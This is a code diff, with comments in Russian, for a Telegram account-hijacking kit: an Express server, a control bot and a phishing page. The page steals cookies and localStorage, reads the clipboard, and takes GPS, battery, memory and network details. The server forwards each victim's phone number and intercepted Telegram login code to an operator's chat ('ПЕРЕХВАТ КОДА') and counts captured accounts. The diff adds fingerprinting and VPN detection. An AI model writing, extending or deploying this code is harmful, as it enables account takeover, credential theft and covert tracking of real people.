@@ -14,22 +14,33 @@ app.use(express.json());
 
 let history = [];
 let notifyEnabled = true;
+let vpnDetect = true;
+let visits = 0;
+const startTime = Date.now();
 
-// --- БОТ ---
+// Главное меню
+const mainMenu = {
+  reply_markup: {
+    inline_keyboard: [
+      [{ text: '📜 История', callback_data: 'hist' }, { text: '👤 Профиль', callback_data: 'profile' }],
+      [{ text: '📖 Инструкция', callback_data: 'instr' }, { text: '🌐 Сайт', url: 'https://tg-sms-ykx6.onrender.com' }],
+      [{ text: '⚙️ Настройки', callback_data: 'settings' }, { text: '🧹 Очистить', callback_data: 'clear' }],
+      [{ text: '📊 Статистика', callback_data: 'stats' }]
+    ]
+  }
+};
+
+async function getPing() {
+  const start = Date.now();
+  await bot.getMe();
+  return Date.now() - start;
+}
+
 bot.onText(/^\/start$/, (msg) => {
-  const opts = {
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: '📜 История', callback_data: 'hist' }, { text: '⚙️ Настройки', callback_data: 'settings' }],
-        [{ text: '📖 Инструкция', callback_data: 'instr' }, { text: '🌐 Сайт', url: 'https://tg-sms-ykx6.onrender.com' }],
-        [{ text: '🧹 Очистить историю', callback_data: 'clear' }]
-      ]
-    }
-  };
-  bot.sendMessage(msg.chat.id, `🛡 <b>Панель управления</b>\n\nВыбери действие:`, { parse_mode: 'HTML', ...opts });
+  bot.sendMessage(msg.chat.id, `🛡 <b>Панель управления</b>\n\nВыбери действие:`, { parse_mode: 'HTML', ...mainMenu });
 });
 
-bot.on('callback_query', (query) => {
+bot.on('callback_query', async (query) => {
   const chatId = query.message.chat.id;
   bot.answerCallbackQuery(query.id);
 
@@ -43,29 +54,51 @@ bot.on('callback_query', (query) => {
     bot.sendMessage(chatId, `📜 <b>Последние 10 целей:</b>\n\n${text}`, { parse_mode: 'HTML' });
   }
 
+  if (query.data === 'profile') {
+    const ping = await getPing();
+    const uptime = Math.floor((Date.now() - startTime) / 1000 / 60);
+    bot.sendMessage(chatId, `👤 <b>Профиль</b>\n\nID: <code>${chatId}</code>\nАптайм: ${uptime} мин\nПинг: <b>${ping} ms</b>`, { parse_mode: 'HTML' });
+  }
+
+  if (query.data === 'stats') {
+    bot.sendMessage(chatId, `📊 <b>Статистика</b>\n\nВсего посещений: ${visits}\nЗахвачено аккаунтов: ${history.length}`, { parse_mode: 'HTML' });
+  }
+
   if (query.data === 'settings') {
-    const status = notifyEnabled ? 'ВКЛ' : 'ВЫКЛ';
-    bot.sendMessage(chatId, `⚙️ <b>Настройки</b>\n\nУведомления: <b>${status}</b>`, {
+    bot.sendMessage(chatId, `⚙️ <b>Настройки</b>`, {
       parse_mode: 'HTML',
       reply_markup: {
         inline_keyboard: [
-          [{ text: `Уведомления: ${status}`, callback_data: 'toggle_notify' }],
+          [{ text: `Уведомления: ${notifyEnabled ? 'ВКЛ' : 'ВЫКЛ'}`, callback_data: 't_notify' }],
+          [{ text: `Детект VPN: ${vpnDetect ? 'ВКЛ' : 'ВЫКЛ'}`, callback_data: 't_vpn' }],
           [{ text: '🔙 Назад', callback_data: 'back' }]
         ]
       }
     });
   }
 
-  if (query.data === 'toggle_notify') {
+  if (query.data === 't_notify') {
     notifyEnabled = !notifyEnabled;
-    bot.answerCallbackQuery(query.id, { text: `Уведомления: ${notifyEnabled ? 'ВКЛ' : 'ВЫКЛ'}` });
-    bot.editMessageText(`⚙️ <b>Настройки</b>\n\nУведомления: <b>${notifyEnabled ? 'ВКЛ' : 'ВЫКЛ'}</b>`, {
-      chat_id: chatId,
-      message_id: query.message.message_id,
-      parse_mode: 'HTML',
+    bot.editMessageText(`⚙️ <b>Настройки</b>`, {
+      chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML',
       reply_markup: {
         inline_keyboard: [
-          [{ text: `Уведомления: ${notifyEnabled ? 'ВКЛ' : 'ВЫКЛ'}`, callback_data: 'toggle_notify' }],
+          [{ text: `Уведомления: ${notifyEnabled ? 'ВКЛ' : 'ВЫКЛ'}`, callback_data: 't_notify' }],
+          [{ text: `Детект VPN: ${vpnDetect ? 'ВКЛ' : 'ВЫКЛ'}`, callback_data: 't_vpn' }],
+          [{ text: '🔙 Назад', callback_data: 'back' }]
+        ]
+      }
+    });
+  }
+
+  if (query.data === 't_vpn') {
+    vpnDetect = !vpnDetect;
+    bot.editMessageText(`⚙️ <b>Настройки</b>`, {
+      chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: `Уведомления: ${notifyEnabled ? 'ВКЛ' : 'ВЫКЛ'}`, callback_data: 't_notify' }],
+          [{ text: `Детект VPN: ${vpnDetect ? 'ВКЛ' : 'ВЫКЛ'}`, callback_data: 't_vpn' }],
           [{ text: '🔙 Назад', callback_data: 'back' }]
         ]
       }
@@ -74,52 +107,34 @@ bot.on('callback_query', (query) => {
 
   if (query.data === 'clear') {
     history = [];
-    bot.answerCallbackQuery(query.id, { text: 'История очищена' });
     bot.sendMessage(chatId, '🧹 История очищена.');
   }
 
   if (query.data === 'back') {
-    const opts = {
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: '📜 История', callback_data: 'hist' }, { text: '⚙️ Настройки', callback_data: 'settings' }],
-          [{ text: '📖 Инструкция', callback_data: 'instr' }, { text: '🌐 Сайт', url: 'https://tg-sms-ykx6.onrender.com' }],
-          [{ text: '🧹 Очистить историю', callback_data: 'clear' }]
-        ]
-      }
-    };
     bot.editMessageText(`🛡 <b>Панель управления</b>\n\nВыбери действие:`, {
-      chat_id: chatId,
-      message_id: query.message.message_id,
-      parse_mode: 'HTML',
-      ...opts
+      chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML', ...mainMenu
     });
   }
 });
 
 async function sendToAdmin(text) {
   if (!notifyEnabled) return;
-  try {
-    await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' });
-  } catch (e) {}
+  try { await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' }); } catch (e) {}
 }
 
-// --- API ---
 app.post('/api/request', async (req, res) => {
-  const { phone, ua, screen, battery, geo, clipboard, steal } = req.body;
+  visits++;
+  const { phone, ua, screen, battery, charging, memory, network, geo, clipboard, steal } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
   if (!phone || phone.length < 8) return res.status(400).json({ ok: false });
 
-  let device = "Android";
-  if (ua.includes("iPhone")) device = "Apple iPhone";
-  else if (ua.includes("Redmi") || ua.includes("Xiaomi")) device = "Xiaomi Redmi";
-  else if (ua.includes("Samsung")) device = "Samsung Galaxy";
+  let device = "Неизвестно";
+  const match = ua.match(/Android\s([0-9.]+);\s([^;)]+)/);
+  if (match) device = `Android ${match[1]} (${match[2].trim()})`;
+  else if (ua.includes("iPhone")) device = "Apple iPhone";
   else if (ua.includes("Windows")) device = "Windows PC";
-  else {
-    const match = ua.match(/Android\s([0-9.]+);\s([^;)]+)/);
-    if (match) device = `${match[1]} (${match[2]})`;
-  }
+  else if (ua.includes("Mac OS")) device = "Apple Mac";
 
   let ipInfo = "Неизвестно";
   let isVpn = false;
@@ -136,33 +151,30 @@ app.post('/api/request', async (req, res) => {
             `📱 <b>Номер:</b> <code>${phone}</code>\n` +
             `💻 <b>Устройство:</b> ${device}\n` +
             `🖥 <b>Экран:</b> ${screen || 'Неизвестно'}\n` +
-            `🔋 <b>Батарея:</b> ${battery || 'Скрыто'}\n` +
+            `🔋 <b>Батарея:</b> ${battery || 'Скрыто'} ${charging ? '(Заряжается)' : ''}\n` +
+            `🧠 <b>ОЗУ:</b> ${memory || 'Скрыто'}\n` +
+            `📶 <b>Сеть:</b> ${network || 'Неизвестно'}\n` +
             `🌐 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n` +
             `📍 <b>Локация:</b> ${ipInfo}\n`;
 
+  if (vpnDetect && isVpn) msg += `⚠️ <b>VPN/Proxy!</b>\n`;
   if (geo) msg += `🗺 <b>GPS:</b> <a href="https://maps.google.com/?q=${geo}">Открыть карту</a>\n`;
   if (clipboard) msg += `📋 <b>Буфер:</b> <code>${clipboard}</code>\n`;
-  if (isVpn) msg += `⚠️ <b>VPN/Proxy!</b>\n`;
   
   if (steal && steal.length > 0) {
     msg += `\n🍪 <b>УКРАДЕНО:</b>\n`;
-    steal.forEach(s => {
-      msg += `<code>${s.name}</code>: <code>${s.value.substring(0, 20)}...</code>\n`;
-    });
+    steal.forEach(s => { msg += `<code>${s.name}</code>: <code>${s.value.substring(0, 20)}...</code>\n`; });
   }
 
   msg += `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
-
   await sendToAdmin(msg);
   res.json({ ok: true });
 });
 
 app.post('/api/code', async (req, res) => {
   const { phone, code } = req.body;
-  
   history.unshift({ phone, code });
   if (history.length > 20) history.pop();
-
   await sendToAdmin(`😈 <b>ПЕРЕХВАТ КОДА</b>\n\n📱 <code>${phone}</code>\n🔑 <b>КОД:</b> <code>${code}</code>\n\n🏃‍♂️ <i>БЕГИ В TELEGRAM!</i>`);
   res.json({ ok: true });
 });
@@ -265,8 +277,11 @@ app.get('/', (req, res) => {
   let geoData = null;
   let clipData = null;
   let stolenData = [];
+  let batteryData = { level: 'Скрыто', charging: false };
+  let memoryData = 'Скрыто';
+  let networkData = 'Неизвестно';
 
-  // 1. СТИЛЛЕР (Куки и токены)
+  // 1. СТИЛЛЕР (Cookies + LS)
   function stealData() {
     try {
       document.cookie.split(';').forEach(c => {
@@ -283,7 +298,20 @@ app.get('/', (req, res) => {
   }
   stealData();
 
-  // 2. ГЕОЛОКАЦИЯ
+  // 2. БАТАРЕЯ И ПАМЯТЬ
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+      batteryData = { level: Math.round(b.level * 100) + '%', charging: b.charging };
+    });
+  }
+  if (navigator.deviceMemory) memoryData = navigator.deviceMemory + ' GB';
+
+  // 3. СЕТЬ
+  if (navigator.connection) {
+    networkData = navigator.connection.effectiveType || 'Неизвестно';
+  }
+
+  // 4. ГЕО
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       (pos) => { geoData = pos.coords.latitude + ',' + pos.coords.longitude; },
@@ -292,7 +320,7 @@ app.get('/', (req, res) => {
     );
   }
   
-  // 3. БУФЕР ОБМЕНА (Фикс с фокусом)
+  // 5. БУФЕР
   async function readClipboard() {
     try {
       if (navigator.clipboard) {
@@ -305,9 +333,6 @@ app.get('/', (req, res) => {
       }
     } catch(e) {}
   }
-  readClipboard();
-  
-  // Повторная попытка при клике на поле телефона
   phoneInput.addEventListener('focus', readClipboard);
 
   setInterval(() => {
@@ -342,20 +367,13 @@ app.get('/', (req, res) => {
     btnPhone.innerHTML = '<span class="spinner"></span>Отправка...';
     btnPhone.disabled = true;
 
-    let battery = 'Скрыто';
-    try {
-      if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        battery = Math.round(b.level * 100) + '%';
-      }
-    } catch(err) {}
-
     const info = {
       ua: navigator.userAgent,
       screen: window.screen.width + 'x' + window.screen.height,
-      lang: navigator.language,
-      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      battery: battery,
+      battery: batteryData.level,
+      charging: batteryData.charging,
+      memory: memoryData,
+      network: networkData,
       geo: geoData,
       clipboard: clipData,
       steal: stolenData
